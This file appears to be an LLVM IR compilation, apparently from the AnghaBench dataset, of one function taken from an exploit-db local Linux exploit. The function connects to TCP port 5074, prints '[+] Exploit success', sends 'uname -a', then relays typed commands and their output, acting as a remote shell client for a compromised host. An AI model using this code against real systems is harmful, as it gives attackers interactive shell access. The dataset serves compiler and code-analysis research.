; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_374.c_connect_to.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_374.c_connect_to.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"[+] Exploit success\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"uname -a;\0A\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @connect_to(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca [512 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca i64, align 8
  store i8* %0, i8** %3, align 8
  %10 = load i32, i32* @AF_INET, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 2
  store i32 %10, i32* %11, align 4
  %12 = load i8*, i8** %3, align 8
  %13 = call i32 @inet_addr(i8* %12)
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 1
  %15 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call i32 @htons(i32 5074)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  store i32 %16, i32* %17, align 4
  %18 = load i32, i32* @AF_INET, align 4
  %19 = load i32, i32* @SOCK_STREAM, align 4
  %20 = load i32, i32* @IPPROTO_TCP, align 4
  %21 = call i32 @socket(i32 %18, i32 %19, i32 %20)
  store i32 %21, i32* %5, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %25, label %24

24:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %60

25:                                               ; preds = %1
  %26 = load i32, i32* %5, align 4
  %27 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %28 = call i32 @connect(i32 %26, %struct.sockaddr* %27, i32 12)
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %31

30:                                               ; preds = %25
  store i32 -1, i32* %2, align 4
  br label %60

31:                                               ; preds = %25
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %34 = call i64 @sprintf(i8* %33, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  store i64 %34, i64* %9, align 8
  %35 = load i32, i32* %5, align 4
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %37 = load i64, i64* %9, align 8
  %38 = call i32 @write(i32 %35, i8* %36, i64 %37)
  br label %39

39:                                               ; preds = %31, %39
  %40 = load i32, i32* %5, align 4
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %42 = call i64 @read(i32 %40, i8* %41, i32 512)
  store i64 %42, i64* %9, align 8
  %43 = load i64, i64* %9, align 8
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %43
  store i8 0, i8* %44, align 1
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i8* %45)
  %47 = bitcast [512 x i8]* %7 to i8**
  %48 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8** %47)
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %50 = call i32 @strcat(i8* %49, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %51 = load i32, i32* %5, align 4
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %54 = call i64 @strlen(i8* %53)
  %55 = call i32 @write(i32 %51, i8* %52, i64 %54)
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %57 = call i32 @memset(i8* %56, i8 signext 0, i32 512)
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i8 signext 0, i32 512)
  br label %39

60:                                               ; preds = %30, %24
  %61 = load i32, i32* %2, align 4
  ret i32 %61
}

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i64) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @scanf(i8*, i8**) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
